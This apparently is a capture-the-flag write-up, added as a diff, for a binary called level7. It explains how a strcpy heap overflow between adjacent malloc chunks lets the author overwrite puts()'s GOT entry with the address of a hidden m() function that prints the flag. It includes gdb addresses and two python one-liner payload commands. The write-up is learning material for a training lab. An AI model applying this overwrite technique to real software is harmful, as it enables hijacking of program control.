@@ -1,0 +1,37 @@
+This program is very complex.
+
+It basically involves 2 variables that are allocated using malloc, and for each of them several operations are done :
+
+var1[0] = 1
+var1[1] = malloc(8)
+
+var2[0] = 2
+var2[1] = malloc(8)
+
+strcpy(var1[1], argv[1])
+strcpy(var2[1], argv[2])
+
+As we can see, the way we can interact with the program is by passing 2 arguments to it, which will be copied into the allocated memory.
+After that, nothing is done with it, the program will just read the password from a file and leave.
+
+There is another function called m() that is never called, but prints the flag that was stored in a global variable in the main() function.
+
+Ok, so the breach is obviously in the strcpy, but how can we exploit it ?
+The trick lies in the fact that the allocated buffers are contiguous in memory
+-> After some debugging using gdb, I could demonstrate that :
+`
+var1 = 0x0804a008
+var1[1] = 0x0804a018
+var2 = 0x0804a028
+var2[1] = 0x0804a038
+`
+
+As we can see, the allocated chunks are contiguous, if we overflow var1[1], we can overwrite var2 with any address we want.
+
+We decided to overwrite the GOT (Global Offset Table) address of puts(), which is a function that is called right before the main exits, and replace it with the address of m().
+-> ./level7 `python -c "print 'a'*20 + '\x28\x99\x04\x08'"`
+
+Now the GOT address of puts() is stored in var2[1], and we can now write the address of m() in it.
+-> ./level7 `python -c "print 'a'*20 + '\x28\x99\x04\x08'"` `python -c "print '\xf4\x84\x04\x08'"`
+
+And then launch the exploit !
